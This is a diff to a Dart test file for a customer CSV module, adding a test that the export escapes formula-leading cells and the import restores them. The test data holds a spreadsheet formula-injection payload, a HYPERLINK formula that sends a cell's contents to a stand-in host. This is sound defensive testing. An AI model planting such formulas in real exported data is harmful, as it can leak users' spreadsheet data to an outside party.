@@ -1,4 +1,5 @@
 import 'package:flutter_test/flutter_test.dart';
+import 'package:ottos_core/ottos_core.dart';
 import 'package:ottos_ops/features/customers/customer_csv.dart';
 
 final _export = [
@@ -46,6 +47,34 @@ void main() {
     expect(ana.beneficiaries.first.notes, 'Llamar "antes"');
     expect(ana.beneficiaries.last.ref, 'fila 3');
     expect(customers.last.beneficiaries, isEmpty);
+  });
+
+  test('SEC-3: the export neutralises formulas and the import gives back the values', () {
+    final text = CustomerCsv.export([
+      {
+        'fullName': '=HYPERLINK("https://example.test/?"&B2)',
+        'phone': '+13055550101',
+        'notes': '@SUM(1)',
+        'active': true,
+        'beneficiaries': [
+          {'fullName': '-Rosa', 'phone': '+5352223344', 'street': 'Calle 10', 'municipalityName': 'Boyeros'},
+        ],
+      },
+    ]);
+
+    final cells = Csv.decode(text)[1];
+    expect(cells[0], '\'=HYPERLINK("https://example.test/?"&B2)');
+    expect(cells[1], "'+13055550101", reason: 'Excel shows the + instead of dropping it');
+    expect(cells[6], "'@SUM(1)");
+    expect(cells[7], "'-Rosa");
+
+    final customer = CustomerCsv.parse(text).single;
+    expect(customer.fullName, '=HYPERLINK("https://example.test/?"&B2)');
+    expect(customer.phone, '+13055550101');
+    expect(customer.notes, '@SUM(1)');
+    expect(customer.beneficiaries.single.fullName, '-Rosa');
+    expect(customer.beneficiaries.single.phone, '+5352223344');
+    expect(BeneficiaryCsv.parse(text).single.phone, '+5352223344');
   });
 
   test('rows of the same customer group even if apart or written differently', () {
